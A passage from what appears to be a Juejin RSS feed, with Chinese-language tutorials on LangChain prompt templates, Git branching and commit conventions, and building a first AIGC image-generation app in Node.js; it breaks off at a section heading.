<span class="hljs-attr">tmp</span> = <span class="hljs-string">""" 我是一位{varliable}初学者，练习时长{learnLenth} """</span> 

<span class="hljs-attr">prompt_template</span> = PromptTemplate(
   <span class="hljs-attr">template</span> = tmp,
   <span class="hljs-attr">input_variables</span> = [<span class="hljs-string">"varliable"</span>,<span class="hljs-string">"learnLenth"</span>], <span class="hljs-comment"># 列表类型</span>
   <span class="hljs-attr">partial_variables</span>={<span class="hljs-string">"learnLenth"</span>:<span class="hljs-string">"两年半"</span>}   <span class="hljs-comment"># 固定 learnLenth 参数值</span>
)

<span class="hljs-attr">result</span> = prompt_template.invoke( {<span class="hljs-string">"varliable"</span>:<span class="hljs-string">"AI应用"</span>} ) 

print(result.text)

<span class="hljs-comment"># 输出  我是一位AI应用初学者,练习时长两年半</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Git 使用规范]]></title>    <link>https://juejin.cn/post/7600837236620427316</link>    <guid>https://juejin.cn/post/7600837236620427316</guid>    <pubDate>2026-01-30T08:44:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600837236620427316" data-draft-id="7600799940970577960" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Git 使用规范"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2026-01-30T08:44:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="完山"/> <meta itemprop="url" content="https://juejin.cn/user/1848713794559706"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Git 使用规范
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1848713794559706/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    完山
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T08:44:55.000Z" title="Fri Jan 30 2026 08:44:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>自用的）在 GitHub 上进行开源项目的开发时，确保代码管理的清晰和协作的顺利进行，有一些常见的最佳实践和规范。以下是一般的规范建议：</p>
<h3 data-id="heading-0">1. Git Flow</h3>
<p>一种经典的分支管理模型，包含 master、develop、feature、release 和 hotfix 分支等。</p>
<p><strong>主分支 (Main/Master Branch)</strong> ： 通常是 main 或 master，这是代码的稳定版本，确保在发布前所有测试通过。</p>
<p><strong>功能分支 (Feature Branches)</strong> ： 每个新的功能或特性应该有一个单独的分支，通常命名为 feature/feature-name。 feature被review通过了就可以合并到develop分支，如果小规模团队和项目的话直接合并到main分支就可以了。git commit -m "feat: 干啥了"</p>
<p><strong>错误修复分支 (Hotfix Branches)</strong> ： 紧急错误修复通常从主分支拉出，命名为 hotfix/fix-name。</p>
<p><strong>开发分支 (Develop Branch)</strong> ： 可选的分支，用于集成所有功能分支，使用在准备发布到主分支前。</p>
<h3 data-id="heading-1">2. Commit Messages</h3>
<p><strong>格式清晰</strong>： 通常结构为：类型: 简短描述。 示例：fix: 修复登录崩溃问题 或 feat: 添加用户注册功能。</p>
<p><strong>使用命令式语气</strong>： 描述“这次提交做了什么”而不是“正在做什么”。</p>
<p><strong>保持简洁</strong>： 通常简短描述不超过50个字符。 如果需要详细描述，可以在下面添加更详细的说明。</p>
<p><strong>Commit Message Conventions</strong>：提交信息通常使用某种规范。使用现在时，简洁不超过50个字符。以下是常见的提交类型：</p>
<pre><code class="hljs language-bash" lang="bash">commit格式：&lt;<span class="hljs-built_in">type</span>&gt;(&lt;scope&gt;): &lt;subject&gt;
  
feat(auth): add login functionality <span class="hljs-comment"># 新增特性</span>
fix(user): correct typo <span class="hljs-keyword">in</span> username validation <span class="hljs-comment"># 修复bug</span>
docs(readme): update installation instructions <span class="hljs-comment"># 更新文档</span>
refactor(api): simplify request handling <span class="hljs-comment"># 代码重构</span>
perf(search): improve search algorithm performance <span class="hljs-comment"># 性能优化</span>
<span class="hljs-built_in">test</span>(button): add unit tests <span class="hljs-keyword">for</span> button component <span class="hljs-comment">#测试</span>
</code></pre>
<h3 data-id="heading-2">3. Pull Requests</h3>
<p><strong>描述明确</strong>： 清晰描述所解决的问题或实现的功能。</p>
<p><strong>引用相关问题</strong>： 使用 closes #issue-number 注解自动关闭相关的 GitHub Issues。</p>
<p><strong>请求代码审查</strong>： 寻求团队成员的审查和反馈。</p>
<h3 data-id="heading-3">4. Git 常用命令</h3>
<h4 data-id="heading-4">拉取代码</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 拉取远程代码（不合并）</span>
git fetch

<span class="hljs-comment"># 拉取远程代码后合并（等同于 git fetch + git merge）</span>
git pull

<span class="hljs-comment"># 拉取远程代码后合并（等同于 git fetch + git rebase）</span>
git pull --rebase
</code></pre>
<h4 data-id="heading-5">提交代码</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 添加所有文件到暂存区</span>
git add .

<span class="hljs-comment"># 提交到本地仓库</span>
git commit -m <span class="hljs-string">"Commit Messages"</span>

<span class="hljs-comment"># 提交到远程仓库</span>
git push
</code></pre>
<h4 data-id="heading-6">撤销更改</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 将工作区恢复到上一次提交的状态（如果误修改了文件想还原）</span>
git restore [file]

<span class="hljs-comment"># 撤销暂存操作（撤销 git add）</span>
git restore --staged [file]

<span class="hljs-comment"># 撤销最近一次 commit（保留本地更改）</span>
git reset --soft HEAD~1

<span class="hljs-comment"># 撤销最近一次 commit 并不保留本地修改（慎用！）</span>
git reset --hard HEAD~1

<span class="hljs-comment"># 撤销已经提交到远端的 commit（保留记录）</span>
git revert [<span class="hljs-built_in">hash</span>]
git push

<span class="hljs-comment"># 查看历史操作</span>
git reflog
git <span class="hljs-built_in">log</span>

<span class="hljs-comment"># 取消已经被 git 追踪的文件（因为 .gitignore 无法取消已经被追踪的文件，此时需要手动取消）</span>
git <span class="hljs-built_in">rm</span> --cached [file]
</code></pre>
<h4 data-id="heading-7">操作分支</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看本地分支，-a 查看所有分支，</span>
git branch

<span class="hljs-comment"># 创建并切换分支</span>
git checkout -b [branch]

<span class="hljs-comment"># 切换到已有分支</span>
git checkout [branch]
git switch [branch]

<span class="hljs-comment"># 修改分支名</span>
git branch -m [branch]

<span class="hljs-comment"># 删除本地分支</span>
git branch -d [branch]

<span class="hljs-comment"># 删除远程仓库分支</span>
git push origin --delete [branch]

<span class="hljs-comment"># 变基分支</span>
git rebase [branch]

<span class="hljs-comment"># 合并分支</span>
git merge [branch]

<span class="hljs-comment"># 合并指定commit</span>
git cherry-pick [<span class="hljs-built_in">hash</span>]
</code></pre>
<h4 data-id="heading-8">新建仓库</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 初始化</span>
git init

<span class="hljs-comment"># 查看远程仓库信息</span>
git remote -v

<span class="hljs-comment"># 添加远程仓库</span>
git remote add origin &lt;repository_url&gt;
git remote set-url origin &lt;repository_ssh&gt;
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[构建你的第一个AIGC应用：从原理到实践]]></title>    <link>https://juejin.cn/post/7600957412128948239</link>    <guid>https://juejin.cn/post/7600957412128948239</guid>    <pubDate>2026-01-30T09:53:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600957412128948239" data-draft-id="7600986252448596008" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="构建你的第一个AIGC应用：从原理到实践"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-01-30T09:53:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lee川"/> <meta itemprop="url" content="https://juejin.cn/user/2402874087453658"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            构建你的第一个AIGC应用：从原理到实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2402874087453658/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lee川
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:53:31.000Z" title="Fri Jan 30 2026 09:53:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">构建你的第一个AIGC应用：从原理到实践</h2>
<h3 data-id="heading-1">一、项目全景：我们要做什么？</h3>
<p>想象一下，你有一个永不疲倦、技艺高超的AI画师。这个项目就是你与这位画师之间的<strong>自动化沟通桥梁</strong>。你通过代码下达指令，AI画师作画，然后将作品（图片网址）送回给你。</p>
<p><strong>核心价值</strong>：将重复性的AI绘图任务自动化，为后续集成到网站、App或工作流中奠定基础。</p>
<h3 data-id="heading-2">二、技术栈深度剖析</h3>
<h4 data-id="heading-3">1. 包管理的进化：为什么是pnpm？</h4>
<p>传统的npm管理依赖时，每个项目都独立存储依赖包。如果你的电脑有10个Vue项目，就会有10份Vue的代码，这显然不高效。</p>
<p><strong>pnpm的聪明之处</strong>：</p>
<ul>
<li>它在本机建立一个<strong>中央仓库</strong>存储所有包</li>
<li>新项目需要包时，pnpm创建一个“快捷方式”指向中央仓库</li>
<li>就像图书馆：书只有一套，但所有读者都能借阅</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 传统方式 - 每个项目独立存储</span>
npm install openai  <span class="hljs-comment"># 下载并存储到当前项目的node_modules</span>

<span class="hljs-comment"># pnpm方式 - 全局链接</span>
pnpm install openai  <span class="hljs-comment"># 创建链接指向全局存储</span>
</code></pre>
<p><strong>实际影响</strong>：安装速度提升2倍，磁盘占用减少50%以上。</p>
<h4 data-id="heading-4">2. 模块化：现代JavaScript的工程化思维</h4>
<p><strong>问题</strong>：早期JavaScript所有代码写在一起，几千行代码难以维护。</p>
<p><strong>解决方案</strong>：像乐高积木一样拆分功能。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 传统写法 - 整个工具箱都拿来</span>
<span class="hljs-keyword">import</span> dotenv <span class="hljs-keyword">from</span> <span class="hljs-string">'dotenv'</span>;
dotenv.<span class="hljs-title function_">config</span>();  <span class="hljs-comment">// 还要通过.来调用</span>

<span class="hljs-comment">// 现代写法 - 只拿需要的工具</span>
<span class="hljs-keyword">import</span> { config } <span class="hljs-keyword">from</span> <span class="hljs-string">'dotenv'</span>;
<span class="hljs-title function_">config</span>({ <span class="hljs-attr">path</span>: <span class="hljs-string">'.env'</span> });  <span class="hljs-comment">// 直接使用</span>
</code></pre>
<p><strong>解构导入的精妙之处</strong>：</p>
<ul>
<li>明确声明：我只需要<code>config</code>这个功能</li>
<li>打包优化：构建工具可以剔除未使用的代码</li>
<li>代码清晰：一眼就知道依赖什么功能</li>
</ul>
<h4 data-id="heading-5">3. 环境变量：安全与配置的艺术</h4>
<p><strong>为什么不用硬编码？</strong></p>
<pre><code class="hljs language-ini" lang="ini">// ❌ 危险做法 - 密码暴露在代码中
const <span class="hljs-attr">apiKey</span> = <span class="hljs-string">"sk-123456789abc"</span><span class="hljs-comment">;</span>

// ✅ 安全做法 - 从环境变量读取
const <span class="hljs-attr">apiKey</span> = process.env.OpenAI_API_KEY<span class="hljs-comment">;</span>
</code></pre>
<p><strong>环境变量的多重价值</strong>：</p>
<ol>
<li><strong>安全性</strong>：代码可以公开，密码保持私有</li>
<li><strong>灵活性</strong>：开发、测试、生产环境使用不同配置</li>
<li><strong>便捷性</strong>：修改配置无需重新部署代码</li>
</ol>
<p><strong>process.env的底层原理</strong>：</p>
<ul>
<li>当Node.js进程启动时，操作系统会注入环境变量</li>
<li><code>process.env</code>是一个特殊的对象，包含所有环境变量</li>
<li>dotenv库的作用：读取.env文件内容，将其添加到<code>process.env</code>中</li>
</ul>
<h4 data-id="heading-6">4. 进程概念：理解程序运行的环境</h4>
<p><strong>前端 vs 后端环境差异</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 前端环境 - 操作浏览器文档</span>
document.<span class="hljs-built_in">getElementById</span>(<span class="hljs-string">'app'</span>);  <span class="hljs-comment">// 操作网页元素</span>
window.location.href;           <span class="hljs-comment">// 获取浏览器地址</span>

<span class="hljs-comment">// 后端环境 - 操作服务器进程  </span>
process.env.API_KEY;           <span class="hljs-comment">// 读取系统环境变量</span>
process.<span class="hljs-built_in">cwd</span>();                 <span class="hljs-comment">// 获取当前工作目录</span>
</code></pre>
<p><strong>进程的深层理解</strong>：</p>
<ul>
<li>每个运行的程序都是操作系统的一个<strong>进程</strong></li>
<li>进程拥有独立的内存空间和系统资源</li>
<li>我们的Node.js脚本运行时，就是一个独立的进程</li>
</ul>
<h3 data-id="heading-7">三、AIGC核心：提示工程的艺术</h3>
<h4 data-id="heading-8">1. API客户端配置：连接AI服务的桥梁</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> client = <span class="hljs-keyword">new</span> <span class="hljs-built_in">OpenAI</span>({
    apiKey: process.env.OpenAI_API_KEY,  <span class="hljs-comment">// 身份认证</span>
    baseURL: <span class="hljs-string">'https://api.agicto.cn/v1'</span>   <span class="hljs-comment">// 服务端点</span>
});
</code></pre>
<p><strong>baseURL的妙用</strong>：</p>
<ul>
<li>默认指向OpenAI官方服务器</li>
<li>可以替换为其他兼容OpenAI API的服务商</li>
<li>在国内访问时，常用代理服务解决网络问题</li>
</ul>
<h4 data-id="heading-9">2. 提示词设计：如何与AI有效沟通？</h4>
<p><strong>提示词演进示例</strong>：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 初级提示词 - 结果随机性强</span>
<span class="hljs-string">"画一只猫"</span>

<span class="hljs-comment">// 中级提示词 - 增加细节约束  </span>
<span class="hljs-string">"画一只橘猫在沙发上晒太阳，温暖的光影"</span>

<span class="hljs-comment">// 高级提示词 - 专业级描述</span>
<span class="hljs-string">"A cute ginger cat lounging on a vintage velvet sofa, bathed in warm sunlight streaming through a window, photorealistic style, 4K resolution"</span>
</code></pre>
<p><strong>提示工程的核心原则</strong>：</p>
<ol>
<li><strong>具体性</strong>：明确主题、风格、细节要求</li>
<li><strong>上下文</strong>：提供足够的背景信息引导AI</li>
<li><strong>约束条件</strong>：指定尺寸、数量、格式等限制</li>
<li><strong>迭代优化</strong>：基于结果不断调整提示词</li>
</ol>
<h3 data-id="heading-10">四、异步编程：现代JavaScript的智慧</h3>
<h4 data-id="heading-11">1. 从回调地狱到async/await</h4>
<p><strong>演进历程</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 回调地狱 - 难以阅读和维护</span>
client.<span class="hljs-property">images</span>.<span class="hljs-title function_">generate</span>(options, <span class="hljs-function">(<span class="hljs-params">error, response</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 处理响应</span>
        client.<span class="hljs-title function_">anotherCall</span>(response, <span class="hljs-function">(<span class="hljs-params">error2, response2</span>) =&gt;</span> {
            <span class="hljs-comment">// 更多嵌套...</span>
        });
    }
});

<span class="hljs-comment">// 2. Promise链 - 稍好但仍复杂  </span>
client.<span class="hljs-property">images</span>.<span class="hljs-title function_">generate</span>(options)
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {
        <span class="hljs-keyword">return</span> client.<span class="hljs-title function_">anotherCall</span>(response);
    })
    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response2</span> =&gt;</span> {
        <span class="hljs-comment">// 处理结果</span>
    })
    .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);
    });

<span class="hljs-comment">// 3. async/await - 同步写法，异步效果</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> client.<span class="hljs-property">images</span>.<span class="hljs-title function_">generate</span>(options);
    <span class="hljs-keyword">const</span> response2 = <span class="hljs-keyword">await</span> client.<span class="hljs-title function_">anotherCall</span>(response);
    <span class="hljs-comment">// 代码清晰如同步</span>
} <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error);
}
</code></pre>
<h4 data-id="heading-12">2. 箭头函数的优势</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 传统函数 - this指向调用者</span>
<span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"test"</span>,
    <span class="hljs-attr">traditional</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);  <span class="hljs-comment">// 输出"test"</span>
    }
};

<span class="hljs-comment">// 箭头函数 - this继承自外层</span>
<span class="hljs-keyword">const</span> obj = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"test"</span>, 
    <span class="hljs-attr">arrow</span>: <span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);  <span class="hljs-comment">// 输出undefined（继承全局）</span>
    }
};
</code></pre>
<h3 data-id="heading-13">五、完整工作流程解析</h3>
